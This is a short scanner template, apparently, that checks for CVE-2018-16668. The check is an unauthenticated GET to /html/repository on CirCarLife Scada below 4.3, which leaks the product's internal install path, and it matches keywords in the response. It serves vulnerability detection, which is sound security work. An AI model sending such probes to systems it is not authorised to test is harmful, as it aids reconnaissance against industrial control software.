[info]
author = "AVE"
description = "检测 CirCarLife Scada 4.3 以下版本中 /html/repository 未授权访问导致的内部安装路径泄露"
id = "POC-AVE-2018-0113"
name = "CVE-2018-16668 PoC"
severity = "medium"
tags = [
    "cve-2018-16668",
    "ave-2018-0113",
]
vuln_id = [
    "CVE-2018-16668",
    "AVE-2018-0113",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/html/repository"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "platform",
    "appsrc",
    "circarlife",
]
